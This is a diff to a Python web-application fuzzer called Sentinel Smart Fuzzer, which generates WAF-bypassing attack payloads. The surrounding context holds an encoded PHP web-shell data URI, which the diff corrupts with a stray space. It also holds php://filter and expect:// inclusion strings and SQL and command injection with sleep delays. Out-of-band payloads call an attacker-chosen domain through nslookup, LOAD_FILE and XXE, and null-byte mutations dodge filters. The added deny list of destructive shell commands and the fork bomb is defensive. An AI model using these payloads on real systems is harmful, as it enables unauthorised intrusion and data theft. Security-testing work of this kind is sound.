@@ -1,4 +1,3 @@
-
 # scanner/fuzzer.py
 # ──────────────────────────────────────────────────────────────────────────────
 # SENTINEL SMART FUZZER — Elite payload generation with WAF bypass chains,
@@ -9,6 +8,10 @@ import random
 import urllib.parse
 import base64
 import html
+import re
+from typing import List, Dict, Set, Callable, Optional, Union
+from dataclasses import dataclass
+from enum import Enum
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -148,7 +151,7 @@ PHP_PAYLOADS = [
     "php://filter/convert.base64-encode/resource=index.php",
     "php://filter/read=string.rot13/resource=index.php",
     "php://input",
-    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
+    "data://text/plain;base64,PD9waHA gc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
     "expect://id",
     "zip://uploads/evil.zip#shell.php",
     # PHP RFI
@@ -320,6 +323,30 @@ HEADER_INJECTION_PAYLOADS = [
 ]
 
 # ─────────────────────────────────────────────────────────────────────────────
+# ENUMS AND DATA STRUCTURES
+# ─────────────────────────────────────────────────────────────────────────────
+
+class VulnType(Enum):
+    XSS = "xss"
+    SQLI = "sqli"
+    PHP = "php"
+    CMDI = "cmdi"
+    SSRF = "ssrf"
+    SSTI = "ssti"
+    TRAVERSAL = "traversal"
+    REDIRECT = "redirect"
+    XXE = "xxe"
+    HEADER = "header"
+
+@dataclass
+class PayloadConfig:
+    """Configuration for payload generation."""
+    mutations_per_payload: int = 4
+    max_payloads_per_type: int = 100
+    include_oob: bool = True
+    include_time_based: bool = True
+
+# ─────────────────────────────────────────────────────────────────────────────
 # WAF BYPASS ENCODING STRATEGIES
 # ─────────────────────────────────────────────────────────────────────────────
 
@@ -354,23 +381,64 @@ def _space_to_comment(p: str) -> str:
 def _plus_encode(p: str) -> str:
     return p.replace(" ", "+")
 
+def _unicode_encode(p: str) -> str:
+    """Convert characters to unicode escape sequences."""
+    return ''.join(f"\\u{ord(c):04x}" if c.isalpha() else c for c in p)
+
+def _hex_encode(p: str) -> str:
+    """Convert to hex representation."""
+    return ''.join(f"\\x{ord(c):02x}" for c in p)
+
 MUTATION_STRATEGIES = [
     lambda x: x,                   # raw
     _url_encode,
     _double_url_encode,
     _html_encode,
+    _base64_encode,
     _comment_break,
     _case_mangle,
     _space_to_tab,
     _space_to_newline,
     _space_to_comment,
     _plus_encode,
+    _unicode_encode,
+    _hex_encode,
     lambda x: x.replace("script", "scri\x00pt"),  # null byte bypass
     lambda x: x.replace("script", "scr\tipt"),     # tab bypass
     lambda x: x.upper(),
     lambda x: x.lower(),
 ]
 
+# ─────────────────────────────────────────────────────────────────────────────
+# PAYLOAD VALIDATION AND SANITIZATION
+# ─────────────────────────────────────────────────────────────────────────────
+
+def _sanitize_payload(payload: str) -> str:
+    """Basic payload sanitization to prevent self-harm."""
+    # Remove any potential command execution that could harm the scanner
+    payload = re.sub(r'(?:;|\||\&\&|\|\|)\s*(?:rm\s+-rf|shutdown|halt|reboot|mkfs|dd\s+if=/dev/random)', '', payload, flags=re.IGNORECASE)
+    return payload
+
+def _is_dangerous_payload(payload: str) -> bool:
+    """Check if payload could potentially harm the scanning system."""
+    dangerous_patterns = [
+        r'rm\s+-rf',
+        r'shutdown',
+        r'halt',
+        r'reboot',
+        r'mkfs',
+        r'dd\s+if=/dev/random',
+        r':(){:|:&};:',  # Fork bomb
+    ]
+    
+    for pattern in dangerous_patterns:
+        if re.search(pattern, payload, re.IGNORECASE):
+            return True
+    return False
+
+# ─────────────────────────────────────────────────────────────────────────────
+# MAIN FUZZER CLASS
+# ─────────────────────────────────────────────────────────────────────────────
 
 class SmartFuzzer:
     """
@@ -384,77 +452,108 @@ class SmartFuzzer:
     """
 
     PAYLOAD_SETS = {
-        "xss":       XSS_PAYLOADS,
-        "sqli":      SQLI_PAYLOADS,
-        "php":       PHP_PAYLOADS,
-        "cmdi":      CMDI_PAYLOADS,
-        "ssrf":      SSRF_PAYLOADS,
-        "ssti":      SSTI_PAYLOADS,
-        "traversal": TRAVERSAL_PAYLOADS,
-        "redirect":  REDIRECT_PAYLOADS,
+        VulnType.XSS: XSS_PAYLOADS,
+        VulnType.SQLI: SQLI_PAYLOADS,
+        VulnType.PHP: PHP_PAYLOADS,
+        VulnType.CMDI: CMDI_PAYLOADS,
+        VulnType.SSRF: SSRF_PAYLOADS,
+        VulnType.SSTI: SSTI_PAYLOADS,
+        VulnType.TRAVERSAL: TRAVERSAL_PAYLOADS,
+        VulnType.REDIRECT: REDIRECT_PAYLOADS,
+        VulnType.XXE: XXE_PAYLOADS,
+        VulnType.HEADER: HEADER_INJECTION_PAYLOADS,
     }
 
-    def generate(self, context_payloads: list, mutations_per: int = 4) -> list:
+    TYPE_MAPPING = {
+        "xss": VulnType.XSS,
+        "sqli": VulnType.SQLI,
+        "sql injection": VulnType.SQLI,
+        "cmdi": VulnType.CMDI,
+        "command": VulnType.CMDI,
+        "ssrf": VulnType.SSRF,
+        "ssti": VulnType.SSTI,
+        "lfi": VulnType.TRAVERSAL,
+        "rfi": VulnType.PHP,
+        "traversal": VulnType.TRAVERSAL,
+        "redirect": VulnType.REDIRECT,
+        "php": VulnType.PHP,
+        "xxe": VulnType.XXE,
+        "header": VulnType.HEADER,
+    }
+
+    def __init__(self, config: Optional[PayloadConfig] = None):
+        self.config = config or PayloadConfig()
+        self._payload_cache: Dict[VulnType, List[str]] = {}
+
+    def generate(self, context_payloads: list, mutations_per: Optional[int] = None) -> list:
         """
         Generates all payloads from context list + base sets, each with mutations.
         Returns a deduplicated list.
         """
-        results = set()
+        mutations = mutations_per or self.config.mutations_per_payload
+        results: Set[str] = set()
 
         # Context-provided payloads + mutations
         for p in context_payloads:
-            results.add(p)
-            for _ in range(mutations_per):
-                results.add(self.mutate(p))
+            if not _is_dangerous_payload(p):
+                sanitized = _sanitize_payload(p)
+                results.add(sanitized)
+                for _ in range(mutations):
+                    mutated = self.mutate(sanitized)
+                    if not _is_dangerous_payload(mutated):
+                        results.add(mutated)
 
         # All base payload sets
         for category, payloads in self.PAYLOAD_SETS.items():
             for p in payloads:
-                results.add(p)
-                # One random mutation per base payload (keeps set size manageable)
-                results.add(self.mutate(p))
+                if not _is_dangerous_payload(p):
+                    sanitized = _sanitize_payload(p)
+                    results.add(sanitized)
+                    # One random mutation per base payload (keeps set size manageable)
+                    mutated = self.mutate(sanitized)
+                    if not _is_dangerous_payload(mutated):
+                        results.add(mutated)
 
-        return list(results)
+        return list(results)[:self.config.max_payloads_per_type]
 
-    def generate_for_type(self, vuln_type: str, mutations_per: int = 6) -> list:
+    def generate_for_type(self, vuln_type: str, mutations_per: Optional[int] = None) -> list:
         """
         Returns a focused, deeply mutated payload list for a specific vulnerability type.
         """
-        key_map = {
-            "xss":          "xss",
-            "sqli":         "sqli",
-            "sql injection":"sqli",
-            "cmdi":         "cmdi",
-            "command":      "cmdi",
-            "ssrf":         "ssrf",
-            "ssti":         "ssti",
-            "lfi":          "traversal",
-            "rfi":          "php",
-            "traversal":    "traversal",
-            "redirect":     "redirect",
-            "php":          "php",
-        }
-        category = key_map.get(vuln_type.lower().strip(), "sqli")
+        mutations = mutations_per or self.config.mutations_per_payload
+        category = self.TYPE_MAPPING.get(vuln_type.lower().strip(), VulnType.SQLI)
+        
+        # Check cache first
+        if category in self._payload_cache:
+            return self._payload_cache[category]
+        
         base = self.PAYLOAD_SETS.get(category, SQLI_PAYLOADS)
+        results: Set[str] = set()
 
-        results = set()
         for p in base:
-            results.add(p)
-            for _ in range(mutations_per):
-                results.add(self.mutate(p))
+            if not _is_dangerous_payload(p):
+                sanitized = _sanitize_payload(p)
+                results.add(sanitized)
+                for _ in range(mutations):
+                    mutated = self.mutate(sanitized)
+                    if not _is_dangerous_payload(mutated):
+                        results.add(mutated)
 
-        return list(results)
+        result_list = list(results)[:self.config.max_payloads_per_type]
+        self._payload_cache[category] = result_list
+        return result_list
 
     def mutate(self, payload: str) -> str:
         strategy = random.choice(MUTATION_STRATEGIES)
         try:
-            return strategy(payload)
+            result = strategy(payload)
+            return _sanitize_payload(result)
         except Exception:
-            return payload
+            return _sanitize_payload(payload)
 
     def get_time_based_payloads(self) -> list:
         """Returns payloads specifically for detecting blind time-based injections."""
-        return [
+        time_based = [
             "' AND SLEEP(6)--",
             "1; WAITFOR DELAY '0:0:6'--",
             "'; SELECT pg_sleep(6)--",
@@ -464,10 +563,11 @@ class SmartFuzzer:
             "$(sleep 6)",
             "`sleep 6`",
         ]
+        return [_sanitize_payload(p) for p in time_based if not _is_dangerous_payload(p)]
 
     def get_oob_payloads(self, oast_domain: str) -> list:
         """Returns out-of-band (OOB/OAST) payloads for blind detection."""
-        return [
+        oob_payloads = [
             f"' AND LOAD_FILE('\\\\\\\\{oast_domain}\\\\share\\\\a')--",
             f"'; exec master..xp_dirtree '\\\\{oast_domain}\\share'--",
             f"| nslookup {oast_domain}",
@@ -479,4 +579,39 @@ class SmartFuzzer:
             # XXE OOB
             f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{oast_domain}/xxe">]><foo>&xxe;</foo>',
         ]
+        return [_sanitize_payload(p) for p in oob_payloads if not _is_dangerous_payload(p)]
 
+    def get_all_payloads(self, include_types: Optional[List[str]] = None) -> Dict[str, List[str]]:
+        """
+        Returns all payloads organized by type.
+        
+        Args:
+            include_types: List of vulnerability types to include (None for all)
+            
+        Returns:
+            Dictionary mapping vulnerability types to payload lists
+        """
+        result = {}
+        types_to_include = include_types or [t.value for t in VulnType]
+        
+        for vuln_type in types_to_include:
+            if vuln_type in self.TYPE_MAPPING:
+                payloads = self.generate_for_type(vuln_type)
+                result[vuln_type] = payloads
+        
+        return result
+
+    def clear_cache(self) -> None:
+        """Clear the payload cache."""
+        self._payload_cache.clear()
+
+
+# Singleton instance for backward compatibility
+_fuzzer: Optional[SmartFuzzer] = None
+
+def get_fuzzer() -> SmartFuzzer:
+    """Get or create SmartFuzzer instance."""
+    global _fuzzer
+    if _fuzzer is None:
+        _fuzzer = SmartFuzzer()
+    return _fuzzer
